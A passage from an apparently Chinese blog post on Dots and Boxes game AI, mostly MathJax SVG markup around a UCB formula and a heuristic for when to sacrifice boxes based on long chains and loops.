250Z"></path></g><g data-mml-node="mi" transform="translate(9849.3,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(10278.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>UCB计算公式：<br>$$<br>r_i=v_i+c<em>\sqrt{\frac{2</em>ln(\sum_{i}T_i)}{T_i}}<br>$$</p><h3 id="优化估值方法"><a href="#优化估值方法" class="headerlink" title="优化估值方法"></a>优化估值方法</h3><p>在游戏的中后期，会出现让格的情况，即牺牲一次围住格子的机会去换取后续更多的格子数。如何判断是否让格是个很大的问题，不妨这样想，</p><ul><li>环和长链越多，则空格多，说明我方应该优先填充仅剩的边线，让对手填充环和长链形成死树，可以让格。</li><li>当前空格少时，环和长链越少，此时应该由当前剩余格子数决定。</li></ul><p>我这里设置一个控制值<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.518ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1997 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(433,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(822,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1608,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.666ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3830.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(433,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(822,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1608,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2274.8,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="mn" transform="translate(3330.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></svg></mjx-container>时，表示可以让格。<br>$$<br>c(G)=size(G)-4<em>longChain-8</em>loops+tb(G)<br>$$</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="103.986ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 45961.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(361,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(790,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1179,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1965,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2631.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(3687.6,0)"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mtable" transform="translate(500,0)"><g data-mml-node="mtr"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(1778,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(6851.6,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(13665.1,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(18738.7,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 